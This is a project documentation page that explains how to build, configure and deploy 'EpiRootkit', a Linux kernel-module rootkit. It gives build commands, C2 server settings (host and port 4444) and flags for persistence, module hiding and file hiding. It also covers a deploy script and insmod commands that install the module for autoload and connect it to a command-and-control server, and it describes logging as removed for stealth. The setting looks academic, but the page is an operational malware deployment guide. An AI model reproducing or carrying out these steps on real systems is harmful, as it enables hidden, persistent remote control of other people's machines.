---
title: "Build & Deployment"
description: "How to build and load EpiRootkit on Ubuntu 20.04"
icon: "code"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 502
---

# Build & Deployment

How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.

## Requirements

### System
- **OS**: Ubuntu 20.04 LTS
- **Kernel**: 5.4.0-* (check with `uname -r`)
- **Architecture**: x86_64

### Dependencies
```bash
sudo apt update
sudo apt install -y build-essential linux-headers-$(uname -r)
```

## Configuration

Edit `rootkit/core/config.h` before building:

```c
// Option 1: Domain name (recommended)
#define C2_SERVER_ADDRESS "jules-c2.example.com"
#define C2_SERVER_PORT 4444

// Option 2: IP address (traditional)
#define C2_SERVER_ADDRESS "192.168.64.1"
#define C2_SERVER_PORT 4444

// Feature settings
#define ENABLE_ENCRYPTION 0      // Encryption disabled
#define ENABLE_PERSISTENCE 1     // Auto-install persistence
#define ENABLE_MODULE_HIDING 1   // Hide module by default
#define ENABLE_FILE_HIDING 1     // Hide files with prefixes
```

## Build Process

```bash
cd rootkit
make clean && make
# ✓ Build successful: epirootkit.ko created

# Verify build
ls -la epirootkit.ko
file epirootkit.ko
# epirootkit.ko: ELF 64-bit LSB relocatable, x86-64
```

## Deployment

### Method 1: Deployment Script (Recommended)
```bash
# Deploy with domain name
sudo ./deploy_rootkit.sh address=c2.example.com

# Deploy with IP address
sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444

# Deploy with defaults from config.h
sudo ./deploy_rootkit.sh
```

**What it does:**
1. Validates module and root privileges
2. Deploys to `/lib/modules/$(uname -r)/extra/`
3. Sets up autoload via `/etc/modules-load.d/`
4. Updates dependencies with `depmod -a`
5. Loads module immediately
6. Verifies deployment

### Method 2: Manual Loading
```bash
# Load with domain
sudo insmod epirootkit.ko address=c2.example.com port=443

# Load with IP
sudo insmod epirootkit.ko address=192.168.1.100 port=4444

# Load with defaults
sudo insmod epirootkit.ko
```

## Verification

### Check Loading
```bash
# Check if loaded (may be hidden if stealth enabled)
lsmod | grep epirootkit

# Alternative check if module is hidden
ls -la /sys/module/epirootkit

```

### Module Status
Since verbose logging has been removed for stealth operation, the rootkit operates silently. 

**Successful loading indicators:**
- Module appears in `/sys/module/epirootkit/` (unless hidden)
- No critical errors in `dmesg`
- C2 server receives connection from new client

**Note:** Operational logs have been removed to maintain stealth - the rootkit operates silently with minimal traces.

## Domain Support

The rootkit supports both domain names and IP addresses for C2 connectivity.

For complete DNS resolution details, see [DNS Resolution](./features/dns-resolution.md).

## Management Commands

### Check Status
```bash
sudo ./deploy_rootkit.sh status
# Module Status: LOADED
# Location: /lib/modules/5.4.0-74-generic/extra/epirootkit.ko
# Autoload: ENABLED (/etc/modules-load.d/epirootkit.conf)
# Connection: CONNECTED (c2.example.com:443)
```

### Complete Removal
```bash
sudo ./deploy_rootkit.sh uninstall
# ✓ Module unloaded
# ✓ Autoload disabled
# ✓ Module file removed
# ✓ Dependencies updated
```

### Update Module
```bash
# Rebuild and redeploy
make clean && make
sudo ./deploy_rootkit.sh update
# ✓ Module updated and reloaded
```
